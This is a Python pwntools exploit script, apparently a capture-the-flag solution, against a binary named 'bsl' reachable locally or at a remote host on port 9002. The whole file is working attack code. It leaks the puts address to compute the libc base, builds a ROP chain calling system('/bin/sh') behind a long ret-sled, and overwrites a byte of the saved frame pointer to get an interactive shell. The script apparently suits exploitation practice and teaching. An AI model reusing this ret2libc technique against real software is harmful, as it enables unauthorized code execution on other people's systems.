from pwn import *


def padding(size, block=8):
    return cyclic(size, alphabet=string.ascii_uppercase, n=block).encode()


def ret_pop_shell_ropchain_payload(rop, libc_base):
    pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
    system_offset = libc.symbols['system']
    bin_sh_offset = next(libc.search(b'/bin/sh'))
    ret_gadget_offset = rop.find_gadget(['ret'])[0]

    system_addr = libc_base + system_offset
    bin_sh_addr = libc_base + bin_sh_offset
    pop_rdi_ret = libc_base + pop_rdi_ret_offset
    ret_gadget = libc_base + ret_gadget_offset
    print('system_addr:', hex(system_addr))
    print('bin_sh_addr:', hex(bin_sh_addr))
    rop_chain = p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret_gadget) + p64(system_addr)
    return rop_chain


def ret_sled(rop, libc_base):
    ret_gadget_offset = rop.find_gadget(['ret'])[0]
    ret_gadget = libc_base + ret_gadget_offset
    ret_sled = p64(ret_gadget)
    return ret_sled


context.arch = 'amd64'

# Set up remote or local process
if args.R:
    p = remote('lmao.lol', 9002)
elif args.H:
    p = process('./bsl')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '85']
    p = gdb.debug('./bsl',
                  gdbscript='''
                      b *most_fav+100
                      b *least_fav+116
                      b *fav+287
                      b *get_answer
                      c
                      ''')

# step1: leak puts the addr from interactive
p.sendlineafter(b"Will you be my friend? (y/n)", b'y')
p.recvuntil(b"My current favourite is: ")
puts_leak = int(p.recvline().strip(), 16)
log.info(f"Puts leak: {hex(puts_leak)}")

# step2: cal libc base addr

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.39-0ubuntu8.2_amd64.so')
puts_offset = libc.symbols['puts']
libc_base = puts_leak - puts_offset

# step3: build ROP chain
rop = ROP(libc)
rop_chain = ret_pop_shell_ropchain_payload(rop, libc_base)

## step4: build RET Sled
ret_sled = ret_sled(rop, libc_base)

## interactive
p.sendlineafter(b"Do you want to learn an interesting fact about a number? (y/n)", b"y")
p.sendlineafter(b"Whats your favourite number?", padding(4))

p.sendlineafter(b'tell me an interesting number fact!',
                ret_sled * 801 + rop_chain)  # sled length = (6446 - 6 - 32 ) /8
#
p.sendlineafter(b"Do you have a LEAST favourite number? (y/n)", b"y")
#
p.recvuntil(b"Mine is: ")
least_fav_leak = int(p.recvline().strip(), 16)
log.info(f"Least fav leak: {hex(least_fav_leak)}")

p.sendlineafter(b"Whats yours?", b'1')

## step 5: overwrite RBP one byte
payload = padding(0xd1)
p.sendlineafter(b"Why not?", payload)

p.interactive()
